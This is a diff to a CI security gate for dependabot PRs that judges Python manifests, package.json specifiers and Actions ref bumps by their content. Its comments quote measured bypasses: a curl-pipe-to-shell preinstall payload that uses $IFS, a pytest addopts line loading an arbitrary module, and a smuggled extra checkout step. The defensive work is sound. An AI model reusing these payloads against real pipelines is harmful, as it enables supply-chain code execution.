@@ -112,11 +112,10 @@ EXEMPTED_AUTHOR = "dependabot[bot]"
 #: A path match alone is enough here: a dependency manifest has no authority over
 #: anything except which versions install.
 MANIFEST_GLOBS = (
-    # pip
-    "**/pyproject.toml",
-    "pyproject.toml",
-    "**/requirements*.txt",
-    "requirements*.txt",
+    # pip: `pyproject.toml` and `requirements*.txt` are NOT here. They moved to
+    # `PYTHON_MANIFEST_GLOBS`, content-judged, for the same reason
+    # `package.json` did -- see the note there. Leaving them path-approved was
+    # the twin this branch failed to sweep when it fixed `package.json`.
     "**/poetry.lock",
     "**/uv.lock",
     # npm / pnpm
@@ -224,6 +223,72 @@ _DIFF_FILE = re.compile(r"^diff --git a/(?P<a>\S+) b/(?P<b>\S+)$")
 #: and cannot simply be removed from the allow-list.
 PACKAGE_JSON_GLOBS = ("**/package.json", "package.json")
 
+#: Python manifests, content-judged for the SAME reason `package.json` is.
+#:
+#: **THIS IS THE TWIN THE `package.json` FIX DID NOT SWEEP.** That round removed
+#: `package.json` from path approval because `ci.yml` executes its scripts, and
+#: left `pyproject.toml` under the identical sentence -- "a dependency manifest
+#: has no authority over anything except which versions install" -- which is
+#: false of it in the same way. `CLAUDE.md`: a defect found in one place exists
+#: in its twins until you have checked, and the sweep stopped at the one file the
+#: review named.
+#:
+#: The root `pyproject.toml` in this repo holds `[tool.ruff] extend-exclude`,
+#: `[tool.ruff.lint] select`/`ignore`, `[tool.black]`, `[tool.bandit] skips` and
+#: `[tool.pytest.ini_options] addopts`. CI's `ruff check`, `black --check`,
+#: `bandit -q -c pyproject.toml` and pytest all read it. `addopts = "-ra -q -p
+#: <module>"` executes an arbitrary installed module at pytest startup; widening
+#: `extend-exclude` or `skips` disables a lint or security gate silently.
+#: Measured 2026-09-23: a changed-file list of `apps/api/pyproject.toml` alone,
+#: under the bot author, exited 0 with no `--diff` required at all.
+#:
+#: pip IS a declared ecosystem and #466/#467 touch `apps/api/pyproject.toml`, so
+#: this is live traffic rather than a hypothetical.
+PYTHON_MANIFEST_GLOBS = (
+    "**/pyproject.toml",
+    "pyproject.toml",
+    "**/requirements*.txt",
+    "requirements*.txt",
+)
+
+#: A dependency line in a Python manifest.
+#:
+#: TOML and requirements files are judged by SHAPE rather than parsed, and the
+#: shape admitted is deliberately narrow: an array element that is a bare quoted
+#: string (`    "anthropic>=0.40,<2",`), or a requirements line that begins with a
+#: distribution name. Everything else -- a `key = value` assignment, a `[table]`
+#: header, an array opener, a `--index-url` or `-e git+...` line -- is REPORTED.
+#:
+#: `addopts = "-ra -q"` does not match, because the assignment puts `addopts = `
+#: before the quote. That is the whole point: the dangerous lines in these files
+#: are assignments, and the safe ones are array elements.
+#:
+#: A false failure here costs a human review of a bot PR. A false pass costs
+#: arbitrary code execution in CI, so the asymmetry decides the direction.
+_PY_ARRAY_ELEMENT = re.compile(r'^[-+][ \t]*"[^"]*"[ \t]*,?[ \t]*$')
+_PY_REQUIREMENT = re.compile(r"^[-+][ \t]*[A-Za-z0-9][A-Za-z0-9._-]*[ \t]*[<>=!~\[].*$")
+
+
+def non_dependency_lines(path: str, lines: list[str]) -> list[str]:
+    """Changed lines in a Python manifest that are not dependency declarations.
+
+    THE RULE IS PER FORMAT, and combining them was a measured hole. The first
+    version accepted a line matching EITHER pattern, and `_PY_REQUIREMENT` allows
+    `=` as the comparison operator -- so `addopts = "-ra -q -p evil_module"` in a
+    TOML file matched the REQUIREMENTS pattern (`addopts` reads as a distribution
+    name, ` = ` as an operator) and passed at exit 0. A requirements line and a
+    TOML assignment are the same shape under one combined rule.
+
+    So: a `.toml` file admits only bare array elements, and a requirements file
+    admits only requirement lines. A TOML assignment is not an array element and
+    is reported, which is the whole point -- the dangerous lines in `pyproject.toml`
+    are assignments (`addopts`, `extend-exclude`, `skips`, `select`) and the safe
+    ones are array elements.
+    """
+    pattern = _PY_ARRAY_ELEMENT if path.endswith(".toml") else _PY_REQUIREMENT
+    return [ln for ln in lines if not pattern.match(ln)]
+
+
 #: A JSON string VALUE that is a dependency specifier rather than a command.
 #:
 #: AN ALLOW-LIST ON THE VALUE, not a denylist on dangerous characters. A denylist
@@ -233,17 +298,37 @@ PACKAGE_JSON_GLOBS = ("**/package.json", "package.json")
 #:
 #: Covered: `1.2.3`, `^1.2.3`, `~1.2`, `>=1.2.3`, `v1.2.3`, `1.2.3-rc.1`,
 #: `1.2.x`, `*`, `latest`, and the `workspace:` / `catalog:` / `npm:` protocols
-#: pnpm uses. NOT covered, deliberately: anything with whitespace (`>=1 <2` is a
-#: legal range and also the shape a command takes), so a compound range comes
-#: back to a human. That is a known false positive and it is the safe direction.
+#: pnpm uses. NOT covered, deliberately: `file:` and `link:` (a local path is not
+#: a version), and anything with whitespace, so a compound range like `>=1 <2`
+#: comes back to a human. That is a known false positive in the safe direction.
+#:
+#: **THE PROTOCOL TAILS WERE `[^\s\"]*` AND THAT WAS A DENYLIST WEARING THIS
+#: DOCSTRING'S CLOTHES.** Everything except whitespace and a quote is still `;`
+#: `|` `&` `$` `(` `)` and a backtick. Measured 2026-09-23, exit 0 on a bot PR:
+#:
+#:     +    "preinstall": "npm:;curl$IFShttp://x|sh",
+#:
+#: One ADDED line -- JSON permits inserting a pair mid-object, so no neighbour
+#: and no comma edit is involved -- and `ci.yml` runs `pnpm install
+#: --frozen-lockfile`, which runs the root `preinstall`.
+#:
+#: The sentence claiming safety was false in its own terms: "anything with
+#: whitespace ... is the shape a command takes" assumes a command needs a space,
+#: and `$IFS` is why it does not. The tails are now bounded to a specifier
+#: charset, which is what the word allow-list was already claiming.
+#: The characters a dependency specifier tail may contain. No `;`, `|`, `&`,
+#: `$`, `(`, `)`, backtick, `:` or whitespace -- so a protocol prefix cannot be
+#: used as a doorway to arbitrary text the way `[^\s\"]*` allowed.
+_SPEC_TAIL = r"[A-Za-z0-9._~^*+@/-]*"
+
 _SPECIFIER = re.compile(
-    r"^(?:"
+    "^(?:"
     r"[\^~]?(?:>=?|<=?|=)?v?\d[\w.\-+]*"
     r"|\*|latest"
-    r"|workspace:[^\s\"]*"
-    r"|catalog:[^\s\"]*"
-    r"|npm:[^\s\"]*"
-    r")$"
+    f"|workspace:{_SPEC_TAIL}"
+    f"|catalog:{_SPEC_TAIL}"
+    f"|npm:{_SPEC_TAIL}"
+    ")$"
 )
 
 #: A changed line in a `package.json`: `"key": "value"`, with an optional comma.
@@ -267,7 +352,7 @@ def non_specifier_lines(lines: list[str]) -> list[str]:
 
 def offending_paths(changed: list[str]) -> list[str]:
     """Paths a version bump has no business touching at all."""
-    allowed = MANIFEST_GLOBS + GITHUB_GLOBS + PACKAGE_JSON_GLOBS
+    allowed = MANIFEST_GLOBS + GITHUB_GLOBS + PACKAGE_JSON_GLOBS + PYTHON_MANIFEST_GLOBS
     return sorted(p for p in changed if not any(fnmatch(p, g) for g in allowed))
 
 
@@ -317,23 +402,43 @@ def non_bump_lines(path: str, lines: list[str]) -> list[str]:
         else:
             parsed.append((m.group("sign"), m.group("action"), m.group("ref"), ln))
 
+    # COUNTS, not just presence. The first version asked only "does the action
+    # appear on the other side, with some other ref", which is set
+    # non-emptiness rather than a pairing -- so a legitimate bump could CARRY an
+    # extra added step for the same action. Measured 2026-09-23, exit 0:
+    #
+    #     -      - uses: actions/checkout@v4
+    #     +      - uses: actions/checkout@v5
+    #     +      - uses: actions/checkout@<40-hex-sha>
+    #
+    # Every line passed: the removal saw `{v5, <sha>}` (non-empty, not `{v4}`),
+    # and each addition saw `{v4}`. A whole extra step, on exactly the traffic
+    # the exemption exists for -- #465 bumps `actions/checkout` across three
+    # workflow files. `owner/repo@<sha>` resolves against the upstream object
+    # store, which includes unmerged fork-PR commits.
+    #
+    # A bump is ONE removal answered by ONE addition. So the counts per action
+    # must match on both sides, and the ref sets must differ.
+    counts: dict[tuple[str, str], int] = {}
     refs: dict[tuple[str, str], set[str]] = {}
     for sign, action, ref, _raw in parsed:
+        counts[(sign, action)] = counts.get((sign, action), 0) + 1
         refs.setdefault((sign, action), set()).add(ref)
 
     bad = list(unparsed)
-    for sign, action, ref, raw in parsed:
-        other = "+" if sign == "-" else "-"
-        counterpart = refs.get((other, action))
-        if not counterpart:
-            # The action appears on one side only. An owner swap lands here
-            # TWICE, once for each side, which is what makes the message name
-            # both halves of the swap.
+    for _sign, action, _ref, raw in parsed:
+        removed = counts.get(("-", action), 0)
+        added = counts.get(("+", action), 0)
+        if removed != added:
+            # Unbalanced: a lone addition (a whole new step), a removal with no
+            # replacement, or a bump carrying an extra. An owner swap lands here
+            # TWICE, once per side, which is what makes the message name both
+            # halves of the swap.
             bad.append(raw)
-        elif counterpart == {ref}:
-            # Present on both sides with the same ref and nothing else: the line
-            # moved, or its indentation changed, but no version changed. Not a
-            # bump, so it is not covered by the exemption.
+        elif refs.get(("-", action)) == refs.get(("+", action)):
+            # Balanced and identical: the line moved or its indentation changed,
+            # but no version changed. Not a bump, so not covered -- and a step
+            # RELOCATED into a job with a wider token is exactly that shape.
             bad.append(raw)
     return bad
 
@@ -448,14 +553,16 @@ def main(argv: list[str]) -> int:
     # `scripts` entry, and `ci.yml` executes the scripts.
     github_paths = [p for p in changed if any(fnmatch(p, g) for g in GITHUB_GLOBS)]
     pkg_paths = [p for p in changed if any(fnmatch(p, g) for g in PACKAGE_JSON_GLOBS)]
-    content_paths = github_paths + pkg_paths
+    py_paths = [p for p in changed if any(fnmatch(p, g) for g in PYTHON_MANIFEST_GLOBS)]
+    content_paths = github_paths + pkg_paths + py_paths
     if content_paths:
         if diff_path is None:
             print(
                 f"check-bot-pr-manifest-only: this PR touches {len(content_paths)} "
                 f"content-judged file(s) "
                 f"({len(github_paths)} under `.github/`, {len(pkg_paths)} "
-                f"`package.json`) and no --diff was given.\n"
+                f"`package.json`, {len(py_paths)} Python manifest) and no "
+                f"--diff was given.\n"
                 "  Exit 2, not a pass. Those files are permitted only when every\n"
                 "  changed line is a `uses:` ref bump, or a dependency specifier,\n"
                 "  and neither can be decided from a file list. Reading the path\n"
@@ -507,6 +614,8 @@ def main(argv: list[str]) -> int:
                 return EXIT_COULD_NOT_LOOK
             if path in pkg_paths:
                 extra = non_specifier_lines(per_file[path])
+            elif path in py_paths:
+                extra = non_dependency_lines(path, per_file[path])
             else:
                 extra = non_bump_lines(path, per_file[path])
             if extra:
@@ -519,11 +628,14 @@ def main(argv: list[str]) -> int:
             # CAUSE, not the check, and this is the only time it is read.
             bad_wf = [v for v in violations if v[0] in github_paths]
             bad_pkg = [v for v in violations if v[0] in pkg_paths]
+            bad_py = [v for v in violations if v[0] in py_paths]
             what = []
             if bad_wf:
                 what.append("`.github/` content that is not a `uses:` ref bump PAIR")
             if bad_pkg:
                 what.append("a `package.json` line that is not a dependency specifier")
+            if bad_py:
+                what.append("a Python manifest line that is not a dependency declaration")
             print(
                 "check-bot-pr-manifest-only: FAILED -- this bot PR changes "
                 + " and ".join(what)
@@ -574,6 +686,11 @@ def main(argv: list[str]) -> int:
         parts.append(
             f"{len(pkg_paths)} `package.json` file(s) whose every changed line "
             f"sets a dependency specifier rather than a script"
+        )
+    if py_paths:
+        parts.append(
+            f"{len(py_paths)} Python manifest(s) whose every changed line "
+            f"declares a dependency rather than a tool setting"
         )
     detail = ", ".join(parts)
     print(
